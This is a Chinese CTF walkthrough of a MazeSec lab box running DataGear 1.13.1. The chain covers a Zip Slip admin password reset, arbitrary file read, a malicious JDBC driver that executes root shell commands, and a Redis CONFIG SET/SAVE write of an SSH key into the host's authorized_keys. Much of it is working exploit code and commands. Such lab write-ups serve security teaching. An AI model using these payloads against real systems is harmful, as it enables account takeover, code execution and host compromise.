> 来源：MazeSec
>
> 靶机ID：832
>
> 难度：Medium
>
> 靶机作者：沫沫
>
> 宿主：`192.168.205.128`
>
> 靶机：`192.168.205.149`
>
> 辅助AI：deepseek-v4.1-flash
>
> 修订于 2026-11-26
>
> **引用与致谢**：本文的漏洞点、POC 和利用工具参考了以下公开资料，特此致谢：
>
> - DataGear 官方仓库与 1.13.1 版本：[datageartech/datagear](https://github.com/datageartech/datagear)、[v1.13.1](https://github.com/datageartech/datagear/releases/tag/v1.13.1)
> - DataGear 驱动上传 RCE（Issue #33）：[Arbitrary Command Execution via Database Driver Upload](https://github.com/datageartech/datagear/issues/33)
> - DataGear `resolveSql` Freemarker 模板注入（Issue #29）：[/dataSet/resolveSql interface freemarker template injection vulnerability](https://github.com/datageartech/datagear/issues/29)
> - DataGear Data Schema Page SpEL 注入（Issue #32 / CVE-2024-7552）：[SpEL Expression Injection Vulnerability in Data Schema Page](https://github.com/datageartech/datagear/issues/32)、[CVE-2024-7552](https://www.cve.org/CVERecord?id=CVE-2024-7552)
> - DataGear SpEL 表达式注入（CVE-2024-37759）：[CVE-2024-37759](https://www.cve.org/CVERecord?id=CVE-2024-37759)
> - Zip Slip 路径穿越：[Snyk: Zip Slip Vulnerability](https://security.snyk.io/research/zip-slip-vulnerability)、[OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
> - Redis 未授权/`CONFIG SET dir` + `SAVE` 写文件：[HackTricks: 6379 - Pentesting Redis](https://book.hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis.html)、[Redis CONFIG SET](https://redis.io/docs/latest/commands/config-set/)、[Redis SAVE](https://redis.io/docs/latest/commands/save/)
> - DataGear 1.13.1 发布说明：[DataGear 1.13.1 发布](https://blog.51cto.com/u_7117633/2860744)、[DataGear 更新日志](http://www.datagear.tech/changelog)
> - 代码参考：[IOUtil.java](https://github.com/datageartech/datagear/blob/v1.13.1/datagear-util/src/main/java/org/datagear/util/IOUtil.java)、[DirectoryFileDataSetEntity.java](https://github.com/datageartech/datagear/blob/v1.13.1/datagear-management/src/main/java/org/datagear/management/domain/DirectoryFileDataSetEntity.java)、[DriverEntityController.java](https://github.com/datageartech/datagear/blob/v1.13.1/datagear-web/src/main/java/org/datagear/web/controller/DriverEntityController.java)、[DataSetController.java](https://github.com/datageartech/datagear/blob/v1.13.1/datagear-web/src/main/java/org/datagear/web/controller/DataSetController.java)

## Flag

| Flag | 值                                            | 位置                           |
| ---- | --------------------------------------------- | ------------------------------ |
| user | `flag{user-520b7713e81f338d95e4eacf65965bee}` | DataGear 容器 `/root/user.txt` |
| root | `flag{root-cb003df02ee841ee3064fb3c0f8d57a6}` | 宿主机 `dvems:/root/root.txt`  |

## 攻击链

```text
192.168.205.149:443  nginx → DataGear 1.13.1
│
├─ 开放注册
│    └─ 普通用户 hacker01
│
├─ Dashboard ZIP 导入 Zip Slip
│    └─ 在 /opt/datacenter 写入重置密码校验文件
│         └─ 重置 admin 密码 → 管理员
│
├─ /analysis/dataSet/previewCsvFile 任意文件读取
│    └─ /root/user.txt → user flag
│
├─ 恶意 JDBC Driver JAR 上传 + /schema/testConnection
│    └─ DataGear 容器内 root RCE（esz-datacenter）
│
└─ Redis 172.31.0.1:6379 弱口令 123456
     └─ CONFIG SET dir /root/.ssh + SAVE
          └─ 写宿主机 root authorized_keys
               └─ SSH 宿主机 root（dvems）→ root flag
```

---

# 信息收集与端口探测

打靶第一步还是老规矩，先确认目标通不通，再全端口扫一遍。目标 `192.168.205.149` 在 VMware 网段里，直接 ping 是通的：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ping -c 2 192.168.205.149
PING 192.168.205.149 (192.168.205.149) 56(84) bytes of data.
64 bytes from 192.168.205.149: icmp_seq=1 ttl=64 time=0.799 ms
64 bytes from 192.168.205.149: icmp_seq=2 ttl=64 time=0.398 ms

--- 192.168.205.149 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1005ms
```

然后直接 `nmap -sC -sV -p-`：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -sC -sV -p- --min-rate 3000 192.168.205.149
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-26 12:00 +0800
Nmap scan report for 192.168.205.149
Host is up (0.0010s latency).
Not shown: 65530 closed tcp ports (reset)
PORT      STATE    SERVICE  VERSION
22/tcp    open     ssh      OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
80/tcp    open     http     nginx
|_http-title: Did not follow redirect to https://192.168.205.149/
443/tcp   open     ssl/http nginx
|_ssl-date: TLS randomness does not represent time
|_http-title: Did not follow redirect to http://192.168.205.149/login;jsessionid=2x5lee5ve7si1j90o1zy56nlc
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
| ssl-cert: Subject: commonName=datacenter.internal/organizationName=Education Data Center/organizationalUnitName=Operations/localityName=ES/stateOrProvinceName=HB/countryName=CN
| Not valid before: 2026-11-13T14:44:48
|_Not valid after:  2036-11-10T14:44:48
6379/tcp  filtered redis
23306/tcp filtered unknown
MAC Address: 08:00:27:38:60:19 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

22、80、443 是明确开放的；6379 和 23306 从外网看都是 filtered。6379 是后面要用的宿主机 Redis；23306 实际是宿主机的 MariaDB，容器侧到网关的非 6379 流量会被 `dg_egress` 直接丢弃，所以它在这条链里用不上。先看 443 上的 Web：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl -skI https://192.168.205.149/
HTTP/1.1 302 Found
Server: nginx
Date: Thu, 26 Nov 2026 04:00:09 GMT
Content-Length: 0
Connection: keep-alive
Set-Cookie: JSESSIONID=yk0e653r91051x2y0htazis5g;Path=/
Expires: Thu, 01 Jan 1970 00:00:00 GMT
Location: http://192.168.205.149/login;jsessionid=yk0e653r91051x2y0htazis5g
```

`JSESSIONID` 说明后端是 Java Web。跟到登录页：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl -skL https://192.168.205.149/login | grep -E '<title>|<form|name="(name|password)"'
<title>大数据可视化 - 登录
<form id="p06f5466981a2135bab5f-form" action="/login/doLogin" method="POST">
<input type="text" name="name" value="" class="ui-widget ui-widget-content" />
<input type="password" name="password" value="" class="ui-widget ui-widget-content" />
```

页面标题是“大数据可视化 - 登录”，底部和静态资源里能看到 `datagear.tech`、`datagear-*.js`，说明这是 **DataGear 数据可视化平台**（官网：[datagear.tech](http://www.datagear.tech)）。

`/about` 页面显示：

```text
名称：教育统计可视化平台
版本：1.0.0
网站：http://www.datagear.tech
```

这里的 `1.0.0` 是部署方的品牌版本，不是 DataGear 产品版本。拿到容器权限后从 `/opt/datacenter/readme.txt`、`derby.log` 和 war 包名确认，实际版本是 **DataGear 1.13.1**：

```text
DataGear-v1.13.1
Bootin Derby version ... Apache Derby - 10.12.1.1
Loaded from file:/tmp/jetty-0.0.0.0-8023-datagear-webapp-1.13.1.war-_-any-/webapp/WEB-INF/lib/derby-10.12.1.1.jar
user.dir=/opt/datacenter
java.runtime.version=1.8.0_512-b09
```

---

# 普通用户注册与攻击面

登录页没有验证码，注册接口直接开放。先注册一个普通用户 `hacker01`：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl -sk -c cookies.txt -b cookies.txt \
  --data-urlencode 'name=hacker01' \
  --data-urlencode 'password=Hacker@12345' \
  --data-urlencode 'confirmPassword=Hacker@12345' \
  --data-urlencode 'realName=Hacker' \
  --data-urlencode 'email=hacker01@test.local' \
  https://192.168.205.149/register/doRegister
{"type":"SUCCESS","code":"success","message":"","throwableDetail":false,"success":true,"fail":false}
```

如果 `hacker01` 已经存在，注册接口会返回失败；直接登录或者换一个用户名即可。

登录并保存会话：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl -sk -c cookies.txt -b cookies.txt \
  --data-urlencode 'name=hacker01' \
  --data-urlencode 'password=Hacker@12345' \
  -D - \
  https://192.168.205.149/login/doLogin
HTTP/1.1 302 Found
Server: nginx
Content-Length: 0
Set-Cookie: JSESSIONID=1pf6r653apu0fc2v2xco9xb0o;Path=/
Location: http://192.168.205.149/
```

普通用户可以访问 `数据源` 和 `数据分析`，但管理页面是 403：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ for p in role user/query driverEntity/add schema/add analysis/dataSet/pagingQuery; do
  printf '%-32s ' "$p"
  curl -sk -b cookies.txt -o /dev/null -w '%{http_code}\n' "https://192.168.205.149/$p"
done
role                             403
user/query                       403
driverEntity/add                 403
schema/add                       200
analysis/dataSet/pagingQuery     200
```

普通用户能建数据源、数据集，也能访问 Dashboard 导入接口。这两个入口就是后面的突破口。

---

# Zip Slip：从普通用户到 admin

## 先看重置密码流程

DataGear 的重置密码不是邮件，而是“服务端文件存在性校验”。先申请 admin 的重置：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl -sk -c rp.txt -b rp.txt https://192.168.205.149/resetPassword -o /dev/null
└─$ curl -sk -c rp.txt -b rp.txt \
  -X POST --data-urlencode 'username=admin' \
  https://192.168.205.149/resetPassword/fillUserInfo
{"type":"SUCCESS","code":"success","message":"","throwableDetail":false,"success":true,"fail":false}
```

再打开第 2 步页面，能看到校验目录和随机 UUID：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl -sk -b rp.txt 'https://192.168.205.149/resetPassword?step=2' \
  | grep -A2 'form-item-value-checkFile'
<div class="form-item-value form-item-value-checkFile">
  请在服务端<span class="ui-state-default">/opt/datacenter</span>目录下新建空白文件：
  <span class="ui-state-default">8f65f9b64f8c47e1bedc3c8e29ba902a</span>
```

也就是说，只要能在 `/opt/datacenter` 下创建这个 UUID 空文件，`/resetPassword/checkUser` 就会通过，然后就能设置 admin 的新密码。源码逻辑在 `ResetPasswordController.java` 里：

```java
File checkFile = FileUtil.getFile(this.resetPasswordCheckFileDirectory,
        resetPasswordStep.getCheckFileName(), false);

if (!checkFile.exists())
    return fail(...);
```

## 再看 Zip Slip

Dashboard 导入接口：

```http
POST /analysis/dashboard/uploadImportFile
multipart/form-data: file=@evil.zip
```

它调用 `IOUtil.unzip(in, tmpDirectory)`，实现是：

```java
File my = new File(directory, zipEntry.getName());

if (zipEntry.isDirectory()) {
    my.mkdirs();
} else {
    File parent = my.getParentFile();
    if (parent != null && !parent.exists())
        parent.mkdirs();

    OutputStream out = getOutputStream(my);
    write(zipInputStream, out);
}
```

**没有对 `zipEntry.getName()` 做规范化，也没有校验 `../`**，因此可以 zip-slip 到临时目录之外（参考：[Snyk Zip Slip](https://security.snyk.io/research/zip-slip-vulnerability)、[OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)；源码：[IOUtil.java](https://github.com/datageartech/datagear/blob/v1.13.1/datagear-util/src/main/java/org/datagear/util/IOUtil.java)）。

Dashboard 导入的临时目录是：

```text
/opt/datacenter/.datagear/temp/<随机目录>
```

重置密码校验目录是 `/opt/datacenter`，所以 ZIP 里写 `../../../<uuid>` 就能从临时目录穿到 `/opt/datacenter/<uuid>`。

## 完整利用脚本

直接用一个 Python 脚本把“申请重置 → 生成 ZIP → 上传 → 校验 → 改密”串起来。脚本默认 `hacker01` 已注册；如果用户名已被占用，注册接口会报错，直接登录即可，或换一个用户名并同步修改脚本里的 `name`：

```python
import io
import re
import zipfile
import requests
import urllib3

urllib3.disable_warnings()
BASE = "https://192.168.205.149"

# 1. 普通用户会话
user = requests.Session()
user.verify = False
user.post(BASE + "/login/doLogin",
          data={"name": "hacker01", "password": "Hacker@12345"},
          timeout=20)

# 2. 申请 admin 重置，拿 UUID
rp = requests.Session()
rp.verify = False
rp.get(BASE + "/resetPassword", timeout=20)
rp.post(BASE + "/resetPassword/fillUserInfo",
        data={"username": "admin"}, timeout=20)

step2 = rp.get(BASE + "/resetPassword?step=2", timeout=20)
uuid = re.search(
    r'新建空白文件：<span class="ui-state-default">([0-9a-f]+)</span>',
    step2.text
).group(1)
print("[+] check dir: /opt/datacenter")
print("[+] uuid:", uuid)

# 3. 生成带 Zip Slip 的压缩包
buf = io.BytesIO()
with zipfile.ZipFile(buf, "w") as z:
    # 临时目录是 /opt/datacenter/.datagear/temp/<dashboardFileName>，
    # 向上 3 层正好回到 /opt/datacenter
    z.writestr("../../../" + uuid, "")
    z.writestr("index.html", "<html><body>x</body></html>")
buf.seek(0)

# 4. 普通用户上传 ZIP
r = user.post(
    BASE + "/analysis/dashboard/uploadImportFile",
    files={"file": ("evil.zip", buf, "application/zip")},
    timeout=30,
)
print("[+] upload:", r.status_code, r.text)
# {"template":"index.html","dashboardFileName":"9cbb9cfc3c2c4e4f84673571d6d3be20","dashboardName":"evil"}

# 5. 通过校验并改密
r = rp.post(BASE + "/resetPassword/checkUser", timeout=20)
print("[+] checkUser:", r.text)

r = rp.post(BASE + "/resetPassword/setNewPassword",
            data={"password": "Hacked@12345",
                  "confirmPassword": "Hacked@12345"},
            timeout=20)
print("[+] setNewPassword:", r.text)
```

实际跑出来的关键输出：

```text
[+] check dir: /opt/datacenter
[+] uuid: 8f65f9b64f8c47e1bedc3c8e29ba902a
[+] upload: 200 {"template":"index.html","dashboardFileName":"9cbb9cfc3c2c4e4f84673571d6d3be20","dashboardName":"evil"}
[+] checkUser: {"type":"SUCCESS","code":"success","message":"","throwableDetail":false,"success":true,"fail":false}
[+] setNewPassword: {"type":"SUCCESS","code":"success","message":"","throwableDetail":false,"success":true,"fail":false}
```

用新密码登录 admin：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl -sk -c admin.txt -b admin.txt \
  --data-urlencode 'name=admin' \
  --data-urlencode 'password=Hacked@12345' \
  -D - \
  https://192.168.205.149/login/doLogin
HTTP/1.1 302 Found
Location: http://192.168.205.149/

┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl -sk -b admin.txt -o /dev/null -w '%{http_code}\n' \
  https://192.168.205.149/role/query
200
```

到这里已经拿到管理员权限。

---

# 任意文件读取：user flag

DataGear 的 CSV 文件数据集支持“服务器端文件”，实现在 `DirectoryFileDataSetEntity.FileSupport`：

```java
if (FILE_SOURCE_TYPE_SERVER.equals(entity.getFileSourceType())) {
    String fileName = entity.resolveFileNameAsFmkTemplate(
            entity.getDataSetResFileName(), paramValues);

    File directory = FileUtil.getDirectory(
            entity.getDataSetResDirectory().getDirectory(), false);

    file = FileUtil.getFile(directory, fileName, false);
}
```

问题在于 `dataSetResDirectory.directory` 直接来自请求体，`previewCsvFile` 只调用 `checkDataSetEntityIdReadPermission(user, dataSet.getId())`；当数据集 ID 为空时，这个检查直接返回 true。所以任何登录用户都能把目录指定成 `/`，读任意文件（源码：[DirectoryFileDataSetEntity.java](https://github.com/datageartech/datagear/blob/v1.13.1/datagear-management/src/main/java/org/datagear/management/domain/DirectoryFileDataSetEntity.java)、[DataSetController.java](https://github.com/datageartech/datagear/blob/v1.13.1/datagear-web/src/main/java/org/datagear/web/controller/DataSetController.java)）。

下面用普通用户 `hacker01` 的会话直接打 `/analysis/dataSet/previewCsvFile`，说明这个接口不是管理员专属；换成 `admin.txt` 同样能读：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl -sk -b cookies.txt \
  -H 'Content-Type: application/json' \
  -X POST https://192.168.205.149/analysis/dataSet/previewCsvFile \
  -d '{
    "dataSet": {
      "name": "read",
      "properties": [],
      "fileSourceType": "SERVER",
      "dataSetResDirectory": {"directory": "/"},
      "dataSetResFileName": "root/user.txt",
      "nameRow": 1,
      "encoding": "UTF-8"
    },
    "paramValues": {}
  }'
{"result":{"data":[]},"properties":[{"name":"flag{user-520b7713e81f338d95e4eacf65965bee}","type":"STRING"}]}
```

CSV 解析器把文件第一行当成列名，所以单行文件的内容出现在 `properties[0].name`，而不是 `result.data`。user flag：

```text
flag{user-520b7713e81f338d95e4eacf65965bee}
```

位置：DataGear 容器 `/root/user.txt`。

---

# 管理员后台与容器内 root RCE

有了 admin 后，可以上传 JDBC 驱动。DataGear 会在“测试连接”时通过 `Class.forName` 加载驱动类，所以只要驱动类里写一个 static 初始化块，就能在类加载时执行命令（参考：[DataGear Issue #33](https://github.com/datageartech/datagear/issues/33)；源码：[DriverEntityController.java](https://github.com/datageartech/datagear/blob/v1.13.1/datagear-web/src/main/java/org/datagear/web/controller/DriverEntityController.java)）。

## 1. 编写恶意驱动

`Exploit.java`：

```java
package evil;

import java.sql.*;
import java.util.Properties;
import java.util.logging.Logger;

public class Exploit implements Driver {
    static {
        try {
            String cmd = "id > /opt/datacenter/pwned.txt 2>&1; "
                    + "hostname >> /opt/datacenter/pwned.txt 2>&1; "
                    + "ls -la / >> /opt/datacenter/pwned.txt 2>&1; "
                    + "ls -la /opt/datacenter >> /opt/datacenter/pwned.txt 2>&1; "
                    + "ls -la /root >> /opt/datacenter/pwned.txt 2>&1; "
                    + "grep Cap /proc/self/status >> /opt/datacenter/pwned.txt 2>&1";
            Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
        } catch (Throwable t) {
            // ignore
        }
    }

    public Connection connect(String url, Properties info) throws SQLException {
        return null;
    }

    public boolean acceptsURL(String url) throws SQLException {
        return true;
    }

    public DriverPropertyInfo[] getPropertyInfo(String url, Properties info)
            throws SQLException {
        return new DriverPropertyInfo[0];
    }

    public int getMajorVersion() { return 1; }
    public int getMinorVersion() { return 0; }
    public boolean jdbcCompliant() { return false; }

    public Logger getParentLogger() throws SQLFeatureNotSupportedException {
        throw new SQLFeatureNotSupportedException();
    }
}
```

编译并打包：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ mkdir -p eviljar/evil
└─$ cd eviljar
└─$ javac --release 8 -d . evil/Exploit.java
└─$ jar cf exploit.jar evil/*.class
└─$ ls -l exploit.jar
-rw-rw-r-- 1 kali kali 1301 Nov 26 00:27 exploit.jar
```

## 2. 上传并注册驱动

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl -sk -b admin.txt \
  -F 'file=@exploit.jar;filename=exploit.jar' \
  'https://192.168.205.149/driverEntity/uploadDriverFile?id=evil'
{"fileInfos":[{"name":"exploit.jar","bytes":1301,"displayName":"exploit.jar","size":"1.3K"}],"driverClassNames":[]}
```

这里 `driverClassNames` 为空是正常的：`resolveDriverClassNames` 只匹配 DataGear 内置的常用驱动类名，自定义的 `evil.Exploit` 不在白名单里，不影响后面的注册和加载。

再注册驱动实体。注意 `saveAdd` 接收的是表单参数，不是 JSON：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl -sk -b admin.txt \
  -X POST 'https://192.168.205.149/driverEntity/saveAdd' \
  --data-urlencode 'id=evil' \
  --data-urlencode 'driverClassName=evil.Exploit' \
  --data-urlencode 'displayName=evil' \
  --data-urlencode 'jreVersion=8' \
  --data-urlencode 'databaseName=evil' \
  --data-urlencode 'databaseVersions=1' \
  --data-urlencode 'driverLibraryName=exploit.jar'
{"type":"SUCCESS","code":"saveSuccess","message":"保存成功","throwableDetail":false,"success":true,"fail":false}
```

`saveAdd` 会把临时目录里的 `exploit.jar` 复制到：

```text
/opt/datacenter/.datagear/driver/evil/exploit.jar
```

## 3. 触发类加载

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl -sk -b admin.txt \
  -X POST 'https://192.168.205.149/schema/testConnection' \
  --data-urlencode 'title=x' \
  --data-urlencode 'url=jdbc:evil:test' \
  --data-urlencode 'user=' \
  --data-urlencode 'password=' \
  --data-urlencode 'driverEntity.id=evil'
{"type":"FAIL","code":"error.PathDriverFactoryException","message":"加载驱动程序出错：No Driver named [evil.Exploit] found in [/opt/datacenter/.datagear/driver/evil]","detail":"org.datagear.connection.PathDriverFactoryException: No Driver named [evil.Exploit] found in [/opt/datacenter/.datagear/driver/evil]\n\tat org.datagear.connection.PathDriverFactory.getDriver(PathDriverFactory.java:153)\n\tat org.datagear.connection.AbstractFileDriverEntityManager.getDriver(AbstractFileDriverEntityManager.java:340)\n\tat org.datagear.connection.DefaultConnectionSource.getConnection(DefaultConnectionSource.java:129"}
```

这个接口实际返回 HTTP 400，但 `No Driver named` 只说明它没有按 JDBC 规范注册成可识别的 Driver，类本身已经被加载，static 块已经执行。看 `/opt/datacenter/pwned.txt`：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl -sk -b admin.txt \
  -H 'Content-Type: application/json' \
  -X POST https://192.168.205.149/analysis/dataSet/previewCsvFile \
  -d '{"dataSet":{"name":"read","properties":[],"fileSourceType":"SERVER","dataSetResDirectory":{"directory":"/"},"dataSetResFileName":"opt/datacenter/pwned.txt","nameRow":1,"encoding":"UTF-8"},"paramValues":{}}'
# 返回 JSON 中 properties[0].name 为 uid=0(root)...，完整文件内容见下
```

实际文件内容（`/opt/datacenter` 只截取关键行）：

```text
uid=0(root) gid=0(root) groups=0(root)
esz-datacenter
--- / ---
total 84
drwxr-xr-x   1 root root 4096 Nov 25 16:23 .
drwxr-xr-x   1 root root 4096 Nov 25 16:23 ..
lrwxrwxrwx   1 root root    7 Nov 10 04:41 bin -> usr/bin
drwxr-xr-x   2 root root 4096 Apr 18  2022 boot
-rwxr-xr-x   1 root root 5977 Nov 11 23:16 __cacert_entrypoint.sh
drwxr-xr-x   5 root root  340 Nov 25 15:37 dev
-rwxr-xr-x   1 root root    0 Nov 13 16:07 .dockerenv
drwxr-xr-x   1 root root 4096 Nov 13 16:07 etc
drwxr-xr-x   2 root root 4096 Apr 18  2022 home
lrwxrwxrwx   1 root root    7 Nov 10 04:41 lib -> usr/lib
lrwxrwxrwx   1 root root    9 Nov 10 04:41 lib32 -> usr/lib32
lrwxrwxrwx   1 root root    9 Nov 10 04:41 lib64 -> usr/lib64
lrwxrwxrwx   1 root root   10 Nov 10 04:41 libx32 -> usr/libx32
drwxr-xr-x   2 root root 4096 Nov 10 04:41 media
drwxr-xr-x   2 root root 4096 Nov 10 04:41 mnt
drwxr-xr-x   1 root root 4096 Nov 25 16:23 opt
dr-xr-xr-x 122 root root    0 Nov 25 15:37 proc
drwx------   1 root root 4096 Nov 13 16:09 root
drwxr-xr-x   5 root root 4096 Nov 10 04:49 run
lrwxrwxrwx   1 root root    8 Nov 10 04:41 sbin -> usr/sbin
drwxr-xr-x   2 root root 4096 Nov 10 04:41 srv
dr-xr-xr-x  13 root root    0 Nov 25 15:37 sys
drwxrwxrwt   1 root root 4096 Nov 25 15:37 tmp
drwxr-xr-x   1 root root 4096 Nov 10 04:41 usr
drwxr-xr-x   1 root root 4096 Nov 10 04:48 var
--- /opt/datacenter ---
-rw-r--r--   1 root root     0 Nov 25 16:23 8f65f9b64f8c47e1bedc3c8e29ba902a
--- /root ---
total 24
drwx------ 1 root root 4096 Nov 13 16:09 .
drwxr-xr-x 1 root root 4096 Nov 25 16:23 ..
-rw-r--r-- 1 root root 3106 Oct 15  2021 .bashrc
-rw-r--r-- 1 root root  161 Jul  9  2019 .profile
-rw------- 1 root root   44 Nov 13 16:11 user.txt
-rw-r--r-- 1 root root 165 Nov 11 23:16 .wget-hsts
```

`grep Cap` 结果：

```text
CapInh:	0000000000000000
CapPrm:	0000000000000000
CapEff:	0000000000000000
CapBnd:	0000000000000000
CapAmb:	0000000000000000
```

容器内已经是 root，但 `CapEff=0`，没有 `docker.sock`，`/root` 里只有 `user.txt`，没有 `root.txt`。所以 root flag 不在 DataGear 容器里，需要继续往外走。

---

# 容器逃逸：Redis 写 SSH key

## 1. 找 Redis

容器的网关是 `172.31.0.1`，先看路由：

```bash
root@esz-datacenter:/opt/datacenter# cat /proc/net/route
Iface	Destination	Gateway 	Flags	RefCnt	Use	Metric	Mask		MTU	Window	IRTT
eth0	00000000	01001FAC	0003	0	0	0	00000000	0	0	0
eth0	00001FAC	00000000	0001	0	0	0	00FFFFFF	0	0	0
```

从容器里探测网关端口：

```bash
root@esz-datacenter:/opt/datacenter# for p in 22 80 443 6379 23306; do
  timeout 0.5 bash -c "echo >/dev/tcp/172.31.0.1/$p" 2>/dev/null && echo "OPEN 172.31.0.1:$p"
done
OPEN 172.31.0.1:6379
```

外网 `6379/tcp` 是 filtered，但容器内可以访问宿主机上的 Redis（参考：[HackTricks: 6379 - Pentesting Redis](https://book.hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis.html)）。

Redis 信息：

```text
redis_version:8.0.2
executable:/usr/bin/redis-server
config_file:/etc/redis/cache.conf
os:Linux 7.2.7-1-liquorix-amd64 x86_64
protected-mode:no
bind:0.0.0.0
requirepass:123456
dir:/var/lib/redis
dbfilename:dump.rdb
```

## 2. 确认密码和权限

试了几组常见口令，`123456` 直接 `+OK`：

```text
AUTH 123456
+OK

CONFIG GET requirepass
*2
$11
requirepass
$6
123456
```

先确认 Redis 进程权限。能写 `/etc/cron.d` 说明 Redis 以 **root** 权限运行（`/etc/cron.d` 是 root 属主，普通 `redis` 用户写不进去）：

```text
CONFIG SET dir /etc/cron.d
+OK
CONFIG SET dbfilename pwn_test
+OK
SET pwn "\n* * * * * root /bin/sh -c 'id > /root/pwned_by_redis'\n"
+OK
SAVE
+OK
```

不过 `SAVE` 写出的是 RDB 二进制文件，cron 不会把它当成合法的 crontab 解析，所以这里只用来确认权限，不靠 cron 落地。Redis 8 默认会保护 `dir`、`dbfilename` 这类配置，目标环境的 `/etc/redis/cache.conf` 里开了 `enable-protected-configs yes`，下面的 `CONFIG SET` 才能成功；换一台默认配置的 Redis 8 需要先注意这一点。

## 3. 写宿主机 root 的 authorized_keys

先确认 `/root/.ssh` 存在：

```text
CONFIG SET dir /root/.ssh
+OK
```

如果这里返回错误，说明 `/root/.ssh` 不存在，需要先创建目录再继续。

生成 SSH 密钥：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ssh-keygen -t ed25519 -f id_ed25519 -N ''
└─$ cat id_ed25519.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIN72VsfYD0J4snU2YRK9wCcr6yY7YXKaqeYLXlEDTVQh kali@kali
```

DataGear 容器里自带 `redis-cli`，直接用它发命令即可：

```bash
root@esz-datacenter:/opt/datacenter# PUB="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIN72VsfYD0J4snU2YRK9wCcr6yY7YXKaqeYLXlEDTVQh kali@kali"
root@esz-datacenter:/opt/datacenter# redis-cli --no-auth-warning -h 172.31.0.1 -p 6379 -a 123456 \
  CONFIG SET dir /root/.ssh
OK
root@esz-datacenter:/opt/datacenter# redis-cli --no-auth-warning -h 172.31.0.1 -p 6379 -a 123456 \
  CONFIG SET dbfilename authorized_keys
OK
root@esz-datacenter:/opt/datacenter# printf '\n%s\n' "$PUB" | \
  redis-cli --no-auth-warning -h 172.31.0.1 -p 6379 -a 123456 -x SET sshkey
OK
root@esz-datacenter:/opt/datacenter# redis-cli --no-auth-warning -h 172.31.0.1 -p 6379 -a 123456 SAVE
OK
root@esz-datacenter:/opt/datacenter# redis-cli --no-auth-warning -h 172.31.0.1 -p 6379 -a 123456 \
  CONFIG SET dir /var/lib/redis
OK
root@esz-datacenter:/opt/datacenter# redis-cli --no-auth-warning -h 172.31.0.1 -p 6379 -a 123456 \
  CONFIG SET dbfilename dump.rdb
OK
```

最后两步是把 Redis 的 `dir` 和 `dbfilename` 恢复原样，避免影响后续持久化。

`SAVE` 生成的是 RDB 文件，开头是 `REDIS0012` 这样的二进制头，但 SSH 的 `authorized_keys` 解析器会忽略无效行；只要公钥在独立一行，sshd 就能正确解析：

```text
REDIS0012...<binary>
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIN72VsfYD0J4snU2YRK9wCcr6yY7YXKaqeYLXlEDTVQh kali@kali
<binary suffix>
```

## 4. 登录宿主机 root

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ssh -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -i id_ed25519 \
    root@192.168.205.149
Warning: Permanently added '192.168.205.149' (ED25519) to the list of known hosts.
uid=0(root) gid=0(root) groups=0(root)
dvems
```

读取 root flag：

```bash
root@dvems:~# cat /root/root.txt
flag{root-cb003df02ee841ee3064fb3c0f8d57a6}
```